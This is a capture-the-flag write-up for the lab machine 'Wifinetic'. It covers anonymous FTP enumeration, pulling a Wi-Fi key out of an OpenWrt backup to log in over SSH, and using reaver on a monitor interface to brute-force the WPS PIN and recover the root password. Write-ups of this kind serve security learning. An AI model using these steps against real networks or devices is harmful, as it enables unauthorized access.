---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Wifinetic

## Enumeration

### Nmap

```
└─$ sudo nmap -sV -sC 10.10.11.247 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 18:07 EDT
Nmap scan report for 10.10.11.247
Host is up (0.042s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.33
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds
```

### FTP

So there is FTP server with some files available to anonymous login

```
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
Name (10.10.11.247:kali): anonymous
230 Login successful.
...
ftp> ls
229 Entering Extended Passive Mode (|||45339|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
```

I download all the files.

There are some documents about preparing migration of OpenWRT. And and tar with backups.

After scanning the backup files, we can point the

```
# in etc/passwd
netadmin:x:999:999::/home/netadmin:/bin/false
```

Which is the user, and

```
# in etc/config/wireless
config wifi-iface 'wifinet0'
	option device 'radio0'
	option mode 'ap'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
	option wps_pushbutton '1'
```

This was really usefull in scanning

```
grep -Ril 'pass'
# Try to scan for passwords in configs
```

and indeed trying to ssh inside works

```
ssh netadmin@10.10.11.247
# VeRyUniUqWiFIPasswrd1!
```

Taht's for the user

## To Root

The system runs wifi router. So let's poke around

```
ifconfig
```

So there are two wireless interfaces up. But I don't know about their APs (acess points).

Check the `wpa_supplicatnt` an authentication service, what can it tell us

```
netadmin@wifinetic:~$ systemctl status wpa_supplicant.service
● wpa_supplicant.service - WPA supplicant
     Loaded: loaded (/lib/systemd/system/wpa_supplicant.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2023-09-25 21:33:22 UTC; 24s ago
   Main PID: 159268 (wpa_supplicant)
      Tasks: 1 (limit: 4595)
     Memory: 1.2M
     CGroup: /system.slice/wpa_supplicant.service
             └─159268 /sbin/wpa_supplicant -u -s -c /etc/wpa_supplicant.conf -i wlan1
```

So it listens to  `wlan1` interface.

There is also another `hostapd` service. The writeup says that it is often used on androids to create and manage APs. According to the writeup, it should tell more about interfaces, but I don't see it.

I can list the wireless interfaces

```
iwconfig
```

```
hwsim0    no wireless extensions.                                           
wlan2     IEEE 802.11  ESSID:off/any                                         
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm       
          Retry short limit:7   RTS thr:off   Fragment thr:off               
          Power Management:on                                               
lo        no wireless extensions.                                           
mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm                         
          Retry short limit:7   RTS thr:off   Fragment thr:off               
          Power Management:on                                               
wlan1     IEEE 802.11  ESSID:"OpenWrt"                                       
          Mode:Managed  Frequency:2.412 GHz  Access Point: 02:00:00:00:00:00 
          Bit Rate:36 Mb/s   Tx-Power=20 dBm                                 
          Retry short limit:7   RTS thr:off   Fragment thr:off               
          Power Management:on                                               
          Link Quality=70/70  Signal level=-30 dBm                           
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0           
          Tx excessive retries:0  Invalid misc:8   Missed beacon:0           
wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm                         
          Retry short limit:7   RTS thr:off   Fragment thr:off               
          Power Management:on
eth0      no wireless extensions.
```

That tells me that: `wlan0` is in master mode, indicating that it got AP configured. `wlan1` is in client mode, so it connects to another wireless network `wlan2` appears offline `mon0` is in monitor mode, used for monitoring/testing

Next, there is `iw` command to display and manipulation with wireless interfaces.

```
iw dev
```

```
phy#2
        Interface mon0
                ifindex 7
                wdev 0x200000002
                addr 02:00:00:00:02:00
                type monitor
                txpower 20.00 dBm
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                type managed
                txpower 20.00 dBm
phy#1
        Unnamed/non-netdev interface
                wdev 0x10000081e
                addr 42:00:00:00:01:00
                type P2P-device
                txpower 20.00 dBm
        Interface wlan1
                ifindex 4
                wdev 0x100000001
                addr 02:00:00:00:01:00
                ssid OpenWrt
                type managed
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
phy#0
        Interface wlan0
                ifindex 3
                wdev 0x1
                addr 02:00:00:00:00:00
                ssid OpenWrt
                type AP
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
```

It tells me about physical devides. `wlan0` is associated with `phy0` which is indeed AP `wlan2` is a client (mode is managed). `wlan2`, and `mon0` are on one physical device. Probably for monitoring

That means that we could bruteforce WPS PIN. But for that specific tools are needed. They would be normally on the network, but they are installed. The story is that they are for testing purposes.

Anyway, I can check if there is somewting with network caps.

```
getcap -r / 2>/dev/null
```

```
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

Aaaand there is `reaver` which is used to attack the WPS PIN. For that I need BSSID of the AP, which I have thanks to the `iw`. Normaly I would use `wash` that is part of the reaver

```
wash -i wlan0
```

But it does not have sufficient permisions. But I have permissions for `mon0`. But then I dont see anything on wash as it does not have the AP.

But I can use the mon0 as it sniffs anyway and I need to listen to the responses somewhere.

```
reaver -i mon0 -b 02:00:00:00:00:00
```

That gives the password

```

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[!] Found packet with bad FCS, skipping...
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
```

Which is also the root password.

```
su root
# WhatIsRealAnDWhAtIsNot51121!
```